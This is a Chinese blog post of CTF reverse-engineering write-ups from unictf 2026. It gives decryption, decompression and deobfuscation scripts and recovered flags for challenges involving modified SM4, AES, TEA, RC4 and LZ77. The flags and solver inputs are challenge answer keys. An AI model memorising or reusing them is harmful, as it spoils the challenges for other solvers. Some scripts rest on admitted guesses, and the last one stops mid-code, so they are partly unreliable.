---
title: unictf 2026
published: 2026-02-13
description: "靠队友带飞，明年还是新生有机会再来😋"
tags: ["CTF"]
draft: false




---

## 

## c_sm4

UPX改成upx0,1,2就能脱了

FK改了

脚本

```
import struct

# 1. 标准 S-Box (未修改)
SM4_SBOX = [
    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,
    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,
    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,
    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,
    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,
    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,
    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,
    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,
    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,
    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,
    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,
    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,
    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,
    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,
    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48
]

# 2. 标准 CK (未修改)
SM4_CK = [
    0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,
    0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,
    0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,
    0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,
    0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,
    0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,
    0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,
    0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279
]


# 3. 辅助函数
def rotl(x, n):
    return ((x << n) & 0xffffffff) | ((x >> (32 - n)) & 0xffffffff)


def sm4_tau(x):
    # 非线性变换 (S-Box)
    a = (x >> 24) & 0xff
    b = (x >> 16) & 0xff
    c = (x >> 8) & 0xff
    d = x & 0xff
    return (SM4_SBOX[a] << 24) | (SM4_SBOX[b] << 16) | (SM4_SBOX[c] << 8) | SM4_SBOX[d]


# 4. 线性变换
def sm4_l(x):
    # 加密/解密用的线性变换 L
    # 代码中未显示 crypt_block 函数，通常只改 KeySchedule 的参数，这里假设 Encryption L 仍为标准
    return x ^ rotl(x, 2) ^ rotl(x, 10) ^ rotl(x, 18) ^ rotl(x, 24)


def sm4_l_prime(x):
    # 密钥扩展用的线性变换 L' (代码中的 Lp)
    # 代码中: v1 = a1 ^ rotl32(a1, 13); return v1 ^ (unsigned int)rotl32(a1, 23);
    # 这与标准 L' 一致
    return x ^ rotl(x, 13) ^ rotl(x, 23)


def sm4_t_prime(x):
    return sm4_l_prime(sm4_tau(x))


# 5. 密钥扩展 (Key Schedule) - 这里需要修改 FK
def sm4_key_schedule(key):
    # 将字节转为 32 位整数
    MK = struct.unpack('>4I', key)

    # ------------------ 魔改部分 ------------------
    # 标准 FK: [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc]
    # 代码中的 FK:
    FK_CUSTOM = [0xA3B1BAC7, 0x56AA3352, 0x677D919A, 0xB27022E0]
    # ---------------------------------------------

    k = [MK[0] ^ FK_CUSTOM[0], MK[1] ^ FK_CUSTOM[1], MK[2] ^ FK_CUSTOM[2], MK[3] ^ FK_CUSTOM[3]]
    rk = []

    for i in range(32):
        temp = k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ SM4_CK[i]
        next_k = k[i] ^ sm4_t_prime(temp)
        rk.append(next_k)
        k.append(next_k)

    return rk


def sm4_one_round(sk, x0, x1, x2, x3):
    return x0 ^ sm4_l(sm4_tau(x1 ^ x2 ^ x3 ^ sk))


def sm4_decrypt_block(rk, ciphertext_block):
    # 解密时轮密钥使用顺序相反
    X = struct.unpack('>4I', ciphertext_block)
    x = list(X)

    # SM4 解密与加密结构相同，只是轮密钥顺序相反
    for i in range(32):
        temp = sm4_one_round(rk[31 - i], x[0], x[1], x[2], x[3])
        x.append(temp)
        x.pop(0)

    # 反序输出 (R35, R34, R33, R32) -> (Y0, Y1, Y2, Y3)
    return struct.pack('>4I', x[3], x[2], x[1], x[0])


def solve():
    import binascii

    # 密文
    hex_cipher = "e35d1c09d861670051587475dba013bfe253923f8571add70f63a674dbeb8f22"
    ciphertext = binascii.unhexlify(hex_cipher)

    # 密钥 (之前提取的)
    key_ints = [1, 35, 69, 103, -119, -85, -51, -17, -2, -36, -70, -104, 118, 84, 50, 16]
    key = bytes([(x + 256) % 256 for x in key_ints])
    print(f"Key: {key.hex().upper()}")

    # 生成轮密钥
    rk = sm4_key_schedule(key)

    # 解密 (ECB 模式)
    decrypted = b""
    for i in range(0, len(ciphertext), 16):
        block = ciphertext[i:i + 16]
        decrypted += sm4_decrypt_block(rk, block)

    print(f"Decrypted Hex: {decrypted.hex()}")

    # 去除 Padding 并显示
    try:
        pad_len = decrypted[-1]
        print(f"Flag: {decrypted[:-pad_len].decode('utf-8')}")
    except:
        print("Flag (Raw):", decrypted)


if __name__ == "__main__":
    solve()
```

Key: 0123456789ABCDEFFEDCBA9876543210
Decrypted Hex: 756e696374667b736d34657a7a6534346d737d0d0d0d0d0d0d0d0d0d0d0d0d0d
Flag: unictf{sm4ezze44ms}

## c_polynomial

这题核心就是：你输入的 9 个整数被当成 8 次多项式

[
P(x)=c_0+c_1x+c_2x^2+\cdots+c_8x^8
]

程序在 `i=-60..59` 逐点算 `P(i)`，并用 `.data` 里的 `v5` 作为“哪些点必须为 0”的位图来校验：

- 若 bit=1 ⇒ `P(i)` **必须等于 0**
- 若 bit=0 或范围外 ⇒ `P(i)` **必须不等于 0**

------

### 1) 从 v5 读出必须为 0 的点

```
v5 = 0x400C0210000001` 的置位 bit 下标为：`[0, 28, 33, 42, 43, 54]
```

代码里用的是 `idx = i + 37`，所以根（必须为 0 的 i）是：

- `i = 0-37 = -37`
- `i = 28-37 = -9`
- `i = 33-37 = -4`
- `i = 42-37 = 5`
- `i = 43-37 = 6`
- `i = 54-37 = 17`

所以 `P(x)` 至少含因子：
[
(x+37)(x+9)(x+4)(x-5)(x-6)(x-17)
]

------

### 2) 用系数约束解出剩下两根

程序后面会把所有系数除以 `c8`（首项系数）做归一化，然后要求：

- `c7 == -606`（x^7 系数）
- `c6 == 44114`（x^6 系数）

归一化后是首项系数为 1 的多项式，因此有：

- (c_7=-\sum r_i=-606 \Rightarrow \sum r_i = 606)
- (c_6=\sum_{i<j} r_ir_j = 44114)

已知 6 个根和为 `-22`，所以剩下两根 (a,b) 满足：

- (a+b = 606 - (-22) = 628)

再由二项积和可推出：

- (ab = 58596)

解得：

- (a=114,; b=514)

因此多项式（归一化后、首项为 1）就是：
[
P(x)=(x+37)(x+9)(x+4)(x-5)(x-6)(x-17)(x-114)(x-514)
]

展开得到（按 **从常数项到 x^8** 的输入顺序）在 32-bit int 下应输入的 9 个数为：

```
-1150729056 1913427864 -1417349260 -195296614 -37214631 1704556 44114 -606 1
```

> 其中有些展开后的“数学整数系数”会超出 32 位，但程序里实际按 32-bit（溢出取模）跑，所以对应的 int32 值就是上面这一组。

把这 9 个整数输入进去，就能过检查。

------

### 3) 直接给你 flag

用这组系数按它的打包方式再 XOR `xorcode`，输出是：

**`unictf{19287189-291837918-knsadainwak-siadnwoadiasg}

## 原神！启动！

Il2CppDumper处理一下

cs里找有明显的encryptedFlagAsset

```
public class GachaManager : MonoBehaviour // TypeDefIndex: 11332
{
	// Fields
	[Header("1. 界面组件")]
	public GameObject bannerPanel; // 0x20
	public GameObject resultPanel; // 0x28
	public Button pullButton; // 0x30
	public TMP_Text currencyText; // 0x38
	public Button closeButton; // 0x40
	public Button exitButton; // 0x48
	[Header("2. 结果展示")]
	public GameObject startGetVideoObj; // 0x50
	public Image charArtImage; // 0x58
	[Header("3. 资源配置")]
	public Sprite[] trashSprites; // 0x60
	public Sprite zhongliSprite; // 0x68
	[Header("4. 加密数据")]
	public TextAsset encryptedFlagAsset; // 0x70
	private int currentStones; // 0x78
	private const int PRICE_PER_PULL = 1;
	private bool isSecretUnlocked; // 0x7C

	// Methods

	// RVA: 0x448930 Offset: 0x447730 VA: 0x180448930
	public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type) { }

	// RVA: 0x448F40 Offset: 0x447D40 VA: 0x180448F40
	private void Start() { }

	// RVA: 0x449220 Offset: 0x448020 VA: 0x180449220
	private void UpdateCurrencyUI() { }

	// RVA: 0x4489F0 Offset: 0x4477F0 VA: 0x1804489F0
	private void OnPullClicked() { }

	// RVA: 0x448BE0 Offset: 0x4479E0 VA: 0x180448BE0
	private void OnVideoEnd(VideoPlayer vp) { }

	// RVA: 0x448D50 Offset: 0x447B50 VA: 0x180448D50
	private void ShowResult() { }

	// RVA: 0x448660 Offset: 0x447460 VA: 0x180448660
	private Sprite DoGachaLogic() { }

	// RVA: 0x4481E0 Offset: 0x446FE0 VA: 0x1804481E0
	private string DecryptAES(int magicKey) { }

	// RVA: 0x448800 Offset: 0x447600 VA: 0x180448800
	private byte[] GenerateKey(int magicVal) { }

	// RVA: 0x4486D0 Offset: 0x4474D0 VA: 0x1804486D0
	private byte[] GenerateIV(int magicVal) { }

	// RVA: 0x448C60 Offset: 0x447A60 VA: 0x180448C60
	private void ReturnToBanner() { }

	// RVA: 0x448C20 Offset: 0x447A20 VA: 0x180448C20
	private void QuitGame() { }

	// RVA: 0x448CA0 Offset: 0x447AA0 VA: 0x180448CA0
	private void ShowMessageBox(string text, string caption) { }

	// RVA: 0x4492B0 Offset: 0x4480B0 VA: 0x1804492B0
	public void .ctor() { }
}

// Namespace: 
```

AssetRipper 把flag_data.bytes提取出来了

iv key从ida拿就行

AES解密脚本

```
import hashlib
from Crypto.Cipher import AES
import binascii

# ================= 配置区域 =================

# 1. 密文 (从 flag_data.bytes 提取)
# 你发的十六进制：C3 75 86 8F ...
hex_data = "C375868FAFFE7FAB6C6E04A923C4EAAFDE52D4AD9A7D3099F1058606A7BFE8BD"
encrypted_bytes = binascii.unhexlify(hex_data)

# 2. 那个神奇的数字 (从 ShowResult 0x180448D50 看到的 0x89)
magic_val = "137"

# 3. 密钥盐 (从 GenerateKey StringLiteral_741 看到的)
key_salt = "GachaSalt_Never_Gonna_Give_You_Up"

# 4. ⚠️ IV 盐 (从 GenerateIV StringLiteral_1940 看到的)
# 【请把这里修改成你在 IDA StringLiteral_1940 里看到的字符串！】
# 盲猜可能是 "GachaSalt_Never_Gonna_Let_You_Down" 或者是类似的梗？
# 如果猜不对，请去 IDA 双击 StringLiteral_1940 查看内容填在这里。
iv_salt = "ZhongLi_Come_In_And11_"


# ================= 解密逻辑 =================

def generate_key_or_iv(salt_str, magic_str):
    # 逻辑还原：MD5( salt + magic_val )
    raw_str = salt_str + magic_str
    return hashlib.md5(raw_str.encode('utf-8')).digest()


def decrypt():
    try:
        # 生成 Key 和 IV
        # Key = MD5("GachaSalt_Never_Gonna_Give_You_Up137")
        key = generate_key_or_iv(key_salt, magic_val)

        # IV = MD5("你的IV字符串137")
        iv = generate_key_or_iv(iv_salt, magic_val)

        print(f"[*] Key (Hex): {key.hex()}")
        print(f"[*] IV  (Hex): {iv.hex()}")

        # AES 解密 (Mode CBC)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(encrypted_bytes)

        # 移除 Padding (PKCS7)
        pad_len = decrypted[-1]
        if pad_len < 1 or pad_len > 16:
            print("[!] Padding 看起来不对，可能是 IV 字符串填错了，或者是 Key 错了。")
            print(f"Raw Decrypt: {decrypted}")
        else:
            flag = decrypted[:-pad_len].decode('utf-8')
            print(f"\n🎉 FLAG: {flag}")

    except Exception as e:
        print(f"❌ 解密失败: {e}")
        print("请检查 iv_salt 变量是否填写正确！")


if __name__ == "__main__":
    decrypt()
```

## Strange_Py

python打包exe

解包，有pyd要分析，upx打包了

tea.pyc也反出来

然后ai分析

```
import struct


def tea_decrypt(v0, v1, key):
    vi = 305419896
    rounds = 50
    s = (0 - (vi * rounds)) & 0xFFFFFFFF
    for _ in range(rounds):
        temp_sum_v_v0 = (s + v0) & 0xFFFFFFFF
        v1 = (v1 - ((temp_sum_v_v0 ^ (key[3] - (v0 >> 5))) ^ (key[2] + (v0 << 4)))) & 0xFFFFFFFF
        temp_sum_v_v1 = (s + v1) & 0xFFFFFFFF
        v0 = (v0 - ((temp_sum_v_v1 ^ (key[1] + (v1 >> 5))) ^ (key[0] + (v1 << 4)))) & 0xFFFFFFFF
        s = (s + vi) & 0xFFFFFFFF
    return v0, v1


def solve():
    with open('flag.enc', 'rb') as f:
        data = f.read()

    # 1. 提取 Key (根据 109549 字节推算的偏移)
    # 尝试从倒数第 29 字节提取 16 字节
    k_raw = data[109520: 109520 + 16]

    # 模拟内核 join1 逻辑：hex(b)[2:] 且不补零拼接
    k_hex_str = "".join([hex(b)[2:] for b in k_raw])
    # 模拟内核 by 逻辑：每 8 位切分转 int
    # 如果 hex 长度不够，说明 key 提取偏移可能需要微调
    try:
        k_ints = [int(k_hex_str[i:i + 8], 16) for i in range(0, 32, 8)]
    except:
        print("Key 转换失败，尝试固定偏移...")
        # 如果提取失败，尝试备用偏移（比如末尾 16 字节）
        k_raw = data[-16:]
        k_hex_str = "".join([hex(b)[2:] for b in k_raw])
        k_ints = [int(k_hex_str[i:i + 8], 16) for i in range(0, 32, 8)]

    # 2. 解密 bt 数据
    bt_data = data[:109520]
    final_plain = bytearray()

    for i in range(0, len(bt_data), 16):
        block = bt_data[i:i + 16]
        # 注意：这里必须用大端序 >I，对应 int(hex, 16)
        v0, v1 = struct.unpack('>2I', block[0:8])
        n2 = block[8:16]

        # TEA 解密
        d0, d1 = tea_decrypt(v0, v1, k_ints)

        # 3. 逆向 xor (这是最难的点)
        # 这里假设 d0, d1 是异或后的 bytes 直接转的 int
        # 尝试最可能的还原方式：
        d_bytes = struct.pack('>2I', d0, d1)
        plain_part = bytes([b ^ s for b, s in zip(d_bytes, n2)])
        final_plain.extend(plain_part)

    # 3. 保存并检查头部
    with open('recovered_file.bin', 'wb') as f:
        f.write(final_plain)

    print(f"解密完成！前 8 字节为: {final_plain[:8].hex()}")
    print(f"尝试解析为字符串: {final_plain[:16].decode(errors='ignore')}")


if __name__ == "__main__":
    solve()
```

得到另一个程序，继续分析

好吧不用分析

记得第一个Hello, World!吗
printf("Unictf{W0OL!!!_Y0uh@Ve_fOuNd_mE}")



## ezobf

首先是一种指定模式的花指令，脚本可以直接去除

```
# IDAPython (IDA 9.1, x64)
# Remove "call + add [rsp], imm + ret" flowers by patching call->jmp real dest.

import idaapi
import idautils
import ida_bytes
import ida_ua
import ida_idp
import ida_auto
import idc

# ====== 配置 ======
PATCH_CALL_TO_JMP = True     # 推荐：把 call 改成 jmp 真落点
FORCE_CODE_AT_DEST = True    # 推荐：在落点强制创建指令
NOP_SKIPPED_RANGE = False    # 谨慎：把 call_end..dest NOP 掉（可能误伤被复用 stub）
LIMIT_TO_TEXT = True
DEBUG_PRINT = True

def _decode(ea):
    insn = ida_ua.insn_t()
    if ida_ua.decode_insn(insn, ea) == 0:
        return None
    return insn

def _mnem(ea):
    return idc.print_insn_mnem(ea).lower()

def _is_call_rel32(insn):
    # 只处理 E8 rel32 (size=5)
    try:
        return (_mnem(insn.ea) == "call" and insn.size == 5 and ida_bytes.get_byte(insn.ea) == 0xE8)
    except Exception:
        return False

def _get_call_target(ea):
    # call 目的地址
    return idc.get_operand_value(ea, 0)

def _op(insn, idx):
    # IDA 9.x: insn.ops 是一个 op_t 数组，后面会有 o_void
    return insn.ops[idx]

def _is_add_rsp_imm_and_ret(stub_ea):
    """
    匹配：
        add [rsp], imm
        ret/retn
    返回 (skip, ret_ea) 或 None
    """
    insn1 = _decode(stub_ea)
    if not insn1 or _mnem(stub_ea) != "add":
        return None

    op0 = _op(insn1, 0)
    op1 = _op(insn1, 1)

    # op0: [rsp] 或 [rsp+0]（IDA 可能用 stack var 展示，但内部一般会归约到 disp=0）
    if op0.type not in (ida_ua.o_phrase, ida_ua.o_displ):
        return None

    rsp_reg = ida_idp.str2reg("rsp")
    if op0.reg != rsp_reg:
        return None

    if op0.type == ida_ua.o_displ:
        # 要求最终位移为 0（顶栈）
        disp = idc.as_signed(op0.addr, 64)
        if disp != 0:
            return None

    # op1: immediate
    if op1.type != ida_ua.o_imm:
        return None
    skip = op1.value & 0xFFFFFFFFFFFFFFFF

    ret_ea = stub_ea + insn1.size
    if _mnem(ret_ea) not in ("ret", "retn"):
        return None

    return skip, ret_ea

def _patch_call_to_jmp(call_ea, dest_ea):
    # call (E8 rel32) -> jmp (E9 rel32)
    rel = dest_ea - (call_ea + 5)
    # rel32 可达性检查
    if not (-0x80000000 <= rel <= 0x7FFFFFFF):
        return False
    ida_bytes.patch_byte(call_ea, 0xE9)
    ida_bytes.patch_dword(call_ea + 1, rel & 0xFFFFFFFF)
    return True

def _force_code(ea, span=0x80):
    # 清掉可能的 dw/dq/data 定义，再从 ea 强制建指令
    try:
        ida_bytes.del_items(ea, ida_bytes.DELIT_EXPAND, span)
    except Exception:
        try:
            ida_bytes.del_items(ea, ida_bytes.DELIT_SIMPLE, 1)
        except Exception:
            pass
    idc.create_insn(ea)

def main():
    if LIMIT_TO_TEXT:
        seg = idaapi.get_segm_by_name(".text")
    else:
        seg = None

    if seg:
        start_ea, end_ea = seg.start_ea, seg.end_ea
    else:
        start_ea = idaapi.inf_get_min_ea()
        end_ea = idaapi.inf_get_max_ea()

    hits = []

    for ea in idautils.Heads(start_ea, end_ea):
        if not ida_bytes.is_code(ida_bytes.get_full_flags(ea)):
            continue

        insn = _decode(ea)
        if not insn:
            continue

        if not _is_call_rel32(insn):
            continue

        call_tgt = _get_call_target(ea)
        if call_tgt in (None, idaapi.BADADDR) or call_tgt == 0:
            continue

        stub = _is_add_rsp_imm_and_ret(call_tgt)
        if not stub:
            continue

        skip, _ = stub
        call_end = ea + insn.size
        dest = call_end + skip

        hits.append((ea, call_tgt, skip, dest))

    if DEBUG_PRINT:
        print("[*] Found %d flower-call patterns" % len(hits))

    fixed = 0
    for (call_ea, stub_ea, skip, dest) in hits:
        try:
            idc.set_cmt(call_ea, f"deobf: call+ret-skip({skip}) -> jmp {dest:#x} (stub {stub_ea:#x})", 0)
        except Exception:
            pass

        ok = True
        if PATCH_CALL_TO_JMP:
            ok = _patch_call_to_jmp(call_ea, dest)

        if ok and NOP_SKIPPED_RANGE:
            call_end = call_ea + 5
            for b in range(call_end, dest):
                ida_bytes.patch_byte(b, 0x90)

        if ok and FORCE_CODE_AT_DEST:
            _force_code(dest)

        if ok:
            fixed += 1

    ida_auto.auto_wait()
    print("[+] Patched %d sites" % fixed)

if __name__ == "__main__":
    main()

```







## r_zip

这是一道通过分析 Rust 编译后的二进制反编译代码来还原压缩算法的题目。代码逻辑虽然因为优化（Fastcall, Rust特有的迭代器结构）显得有些杂乱，但核心的压缩逻辑是典型的 **LZ77 变种**。

### 1. 代码逻辑分析

通过分析 `compress::main` 函数，我们可以提取出以下关键逻辑：

1. **输入与输出**：

   - 程序读取输入文件（`out1` 的原始文件）。
   - 创建一个输出缓冲区（`v65` 作为索引）。
   - 最终将缓冲区写入文件（`out1.z`）。

2. **核心压缩循环**：

   - 代码维护了一个 **256 字节** 的滑动窗口（`if ( v26 < 0x100 ) v30 = v26;`，`v30` 最大为 256）。
   - 它在当前位置的前 256 个字节中寻找最长的匹配字符串。
   - `do ... while` 循环用于向前遍历窗口，比较当前输入 `v20` 和历史数据 `v63`。
   - **匹配长度**：代码中有一连串的 `v36 = ...` 判断，实际上是在计算匹配长度，最大匹配长度似乎被限制在 **14** 字节左右（逻辑中包含 `+1`, `+2` ... `+14` 的偏移判断）。

3. **编码格式（关键点）**：

   - **判断条件**：`if ( v33 < 3 )`。如果找到的匹配长度小于 3，则判定为**字面量（Literal）**。

   - **字面量存储**：

     - `LABEL_98`: 直接读取原始字节 `v39 = v63[v26]` 并写入输出。
     - **注意**：代码中没有显式的转义逻辑。这意味着如果原始字节本身大于等于 `0x80`，可能会与下面的压缩标记冲突。但在 CTF 中，通常我们要严格按照代码逻辑逆向，或者假定文件头大部分是 ASCII。

   - **压缩引用存储（Reference）**：

     - 如果匹配长度 `>= 3`。

     - `v34` 是偏移量（Distance，距离当前位置往前多少字节），`v33` 是匹配长度（Length）。

     - **写入第一个字节**：

       `*((_BYTE *)buf[1] + v65) = (v34 >> 4) | 0x80;`

       这说明压缩标记的最高位（第7位）是 `1`。这里存储了偏移量的高 4 位（或更多，因为窗口是 256，偏移量最大 0x100，需要 9 bit，但通常 0-255 是 8bit。如果 `v34` 是 256，`0x100 >> 4 = 0x10`，`0x80 | 0x10 = 0x90`）。

     - **写入第二个字节**：

       `v39 = (16 * v34) | v33;`

       即 `((v34 & 0x0F) << 4) | (v33 & 0x0F)`。

       这说明第二个字节的高 4 位是偏移量的低 4 位，低 4 位是匹配长度。

### 2. 解压算法推导

根据上述分析，解压逻辑如下：

1. 读取一个字节 `b1`。

2. 检查最高位 `b1 & 0x80`：

   - **如果为 0**：这是**字面量**。直接将该字节写入输出流。

   - **如果为 1**：这是**压缩引用**。

     - 读取下一个字节 `b2`。

     - **计算偏移量 (Distance)**：

       `Distance_High = b1 & 0x1F` (取低5位，兼容最大 256 的偏移)

       `Distance_Low = (b2 >> 4) & 0x0F`

       `Distance = (Distance_High << 4) | Distance_Low`

     - **计算长度 (Length)**：

       `Length = b2 & 0x0F`

     - **操作**：从当前输出流的末尾向前 `Distance` 处，复制 `Length` 个字节到输出流末尾。

### 3. 解题脚本 (Python)

使用以下脚本解密 `out1.z`。

Python

```
import sys
import struct

def decompress(data):
    output = bytearray()
    i = 0
    length_data = len(data)
    
    while i < length_data:
        b1 = data[i]
        i += 1
        
        # 检查最高位是否为 1
        # 注意：这里假设原始文件中的字面量没有与 0x80-0x9F 冲突，
        # 或者压缩算法优先处理了 ASCII 文本。
        if b1 & 0x80:
            if i >= length_data:
                break
            b2 = data[i]
            i += 1
            
            # 还原 Offset (Distance)
            # Byte 1: (Distance >> 4) | 0x80
            # Byte 2: ((Distance & 0xF) << 4) | Length
            
            # 从 b1 取 Distance 的高位
            # 0x1F 是为了覆盖可能出现的 Distance=256 (0x100) 的情况 (0x90)
            dist_high = b1 & 0x1F 
            dist_low = (b2 >> 4) & 0x0F
            distance = (dist_high << 4) | dist_low
            
            # 还原 Length
            length = b2 & 0x0F
            
            # 执行 LZ 复制
            # 从 output 尾部向前 distance 处开始复制
            start_index = len(output) - distance
            
            for _ in range(length):
                if 0 <= start_index < len(output):
                    output.append(output[start_index])
                else:
                    # 异常情况处理，正常不应触发
                    output.append(0)
                start_index += 1
        else:
            # 字面量
            output.append(b1)
            
    return output

def main():
    try:
        with open("out1.z", "rb") as f:
            data = f.read()
    except FileNotFoundError:
        print("[-] 找不到 out1.z 文件")
        return

    decrypted = decompress(data)
    
    output_filename = "out1_decrypted"
    with open(output_filename, "wb") as f:
        f.write(decrypted)
    
    print(f"[+] 解压完成，保存为: {output_filename}")
    
    # 自动识别文件头回答问题
    if len(decrypted) > 10:
        header = decrypted[:6].hex().upper()
        print(f"[*] 文件头: {header}")
        if header.startswith("504B0304"):
            print("[!] 这是一个 ZIP 文件")
        elif header.startswith("377ABCAF271C"):
            print("[!] 这是一个 7z 文件")
        else:
            print("[?] 未知格式，请手动检查")

if __name__ == "__main__":
    main()
```

解出来其实都不是。。是字符画

unictf{miaoyunmengzip}



## r_png

这是一道典型的 Rust 编写的 CTF 逆向题目。通过分析提供的伪代码（特别是 `sub_16A40` 函数），我们可以还原出加密逻辑并写出解密脚本。

### 1. 代码逻辑分析

入口函数 `sub_16A40` 包含了核心逻辑，主要流程如下：

1. **参数检查**：

   - 代码检查了命令行参数的数量。
   - 有一个关键的字符串提示：`[!] key 必须是 4 位数字，比如 0123`（在 provided rodata 中可见）。
   - 代码中对 key 进行了校验：`(unsigned __int8)(*v2 - 58) < 0xF6u`。这是一个常见的编译器优化写法，用来检查字符是否在 `'0'` (48) 到 `'9'` (57) 之间。
   - **结论**：Key 是一个 4 位数字的字符串（范围 `0000` - `9999`）。

2. **加密算法识别**：

   - **Key Scheduling Algorithm (KSA)**：

     代码中有一个 `do ... while (v9 != 256)` 的循环，内部操作 `v10 += *(_BYTE *)(v7 + v11) + v12` 以及交换 `v27`（S-box）中的值。这是标准的 RC4 初始化过程。

   - **Pseudo-Random Generation Algorithm (PRGA)**：

     随后的 `while (v6 != v13)` 循环中，进行了 `v14 += v15` 和交换操作，最后将生成的密钥流字节与输入缓冲区 `v4` 进行异或。

     - **关键魔改点**：

       注意这行代码：

       `v4[v13] ^= *((_BYTE *)&v27 + (unsigned __int8)(*((_BYTE *)&v27 + (unsigned __int8)(v13 + 1)) + v15)) + 69;`

       标准的 RC4 是 `C = P ^ K`。

       这里的代码是 `C = P ^ (K + 69)`。

       其中 `69` (十进制) 即 `0x45`。在异或之前，RC4 生成的密钥流字节被加上了 69。

3. **文件操作**：

   - 读取输入文件。
   - 进行魔改 RC4 加密。
   - 输出到文件（根据题目文件名推测，输入是 `flag.png`，输出是 `flag.png.enc`）。

### 2. 解密思路

这是一个**已知明文攻击 (Known Plaintext Attack)** 的绝佳场景。

- **目标文件**：`flag.png.enc`
- **文件格式**：PNG 图片
- **已知信息**：PNG 文件的前 8 个字节（文件头）是固定的：`89 50 4E 47 0D 0A 1A 0A`。
- **爆破策略**：
  1. 遍历 Key 从 `0000` 到 `9999`。
  2. 根据 Key 初始化 RC4 S-box。
  3. 生成前 8 个字节的密钥流。
  4. 应用魔改：`KeystreamByte = (Original_RC4_Byte + 69) & 0xFF`。
  5. 尝试解密密文的前 8 个字节。
  6. 如果解密结果等于 PNG 的固定文件头，则该 Key 正确，随后解密整个文件。

### 3. Python 解密脚本

你可以直接使用以下 Python 脚本来还原 `flag.png`。请确保脚本与 `flag.png.enc` 在同一目录下。

Python

```
import struct


def rc4_init(key):
    """标准的 RC4 KSA 初始化"""
    S = list(range(256))
    j = 0
    key_len = len(key)
    for i in range(256):
        j = (j + S[i] + key[i % key_len]) % 256
        S[i], S[j] = S[j], S[i]
    return S


def rc4_crypt_modified(data, key_str):
    """魔改的 RC4 解密过程"""
    # 将 Key 字符串转换为 ascii 字节数组
    key = [ord(c) for c in key_str]
    S = rc4_init(key)

    i = 0
    j = 0
    res = bytearray()

    # 模拟 C 代码中的逻辑
    # 注意：C代码中 v13 是 buffer index，从 0 开始
    # v15 = S[v13 + 1] 也就是 S[i+1]
    # 这意味着 i 在 PRGA 开始时实际上相当于 0，每次先 +1

    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]

        # 标准 RC4 密钥流字节 K
        K = S[(S[i] + S[j]) % 256]

        # 题目中的魔改点：K + 69
        # C代码: v4[v13] ^= (K + 69)
        # 解密逻辑相同: Plain = Cipher ^ (K + 69)
        modified_K = (K + 69) & 0xFF

        res.append(byte ^ modified_K)

    return res


def solve():
    filename = "flagpngenc"
    try:
        with open(filename, "rb") as f:
            encrypted_data = f.read()
    except FileNotFoundError:
        print(f"[-] 未找到文件 {filename}，请确保文件名正确。")
        return

    # PNG 文件头标准魔数
    png_magic = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'

    print("[*] 开始爆破 4 位数字 Key...")

    for k in range(10000):
        # 格式化为 4 位字符串，例如 "0123"
        key_str = f"{k:04d}"

        # 我们只需要先解密前 8 字节来验证 Key
        header_dec = rc4_crypt_modified(encrypted_data[:8], key_str)

        if header_dec == png_magic:
            print(f"[+] 找到 Key: {key_str}")
            print("[*] 正在解密完整文件...")

